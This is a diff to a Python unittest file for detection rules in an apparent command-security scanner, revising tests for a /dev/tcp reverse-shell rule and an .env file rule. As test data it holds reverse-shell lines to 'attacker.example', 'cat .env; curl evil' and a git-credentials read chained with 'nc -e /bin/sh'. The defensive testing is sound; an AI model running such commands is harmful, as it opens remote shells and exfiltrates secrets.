@@ -3687,8 +3687,16 @@ class StrictPackRegexCoverage(unittest.TestCase):
     def test_f0926_devtcp_hostname_target(self):
         self._assert_rule_matches(
             self.commands["CMD-REVSHELL-DEVTCP"],
-            "exec 5<>/dev/tcp/attacker.example/4444",
+            "bash --interactive 5<>/dev/tcp/attacker.example/4444",
             severity="CRITICAL",
+        )
+        # A standalone bidirectional descriptor is a legitimate health-probe
+        # primitive and must not be treated as reverse-shell proof by regex.
+        self.assertIsNone(
+            re.search(
+                self.commands["CMD-REVSHELL-DEVTCP"]["pattern"],
+                "exec 5<>/dev/tcp/attacker.example/4444",
+            )
         )
         # Dotted-quad form must keep matching (no regression).
         self.assertTrue(
@@ -3766,13 +3774,14 @@ class StrictPackRegexCoverage(unittest.TestCase):
             severity="CRITICAL",
         )
 
-    # F-0934: .env path followed by a shell command separator.
-    def test_f0934_env_file_shell_separator(self):
-        self._assert_rule_matches(
-            self.paths["PATH-ENV-FILE"],
-            "cat .env; curl evil",
-            severity="HIGH",
-        )
+    # F-0934: .env is semantic-only so writes and mentions stay quiet while
+    # exact ActionFacts can retain proven reads and uploads.
+    def test_f0934_env_file_is_semantic_only(self):
+        rule = self.paths["PATH-ENV-FILE"]
+        self.assertEqual(rule["pattern"], "a^")
+        self.assertEqual(rule["expression"], "true")
+        self.assertEqual(rule["severity"], "HIGH")
+        self.assertIsNone(re.search(rule["pattern"], "cat .env; curl evil"))
 
     # F-1908 (chain): `cat ${HOME}/.git-credentials; nc -e /bin/sh host port`
     # bypassed BOTH the Git-creds rule (F-0932) and the netcat rule (F-0927).
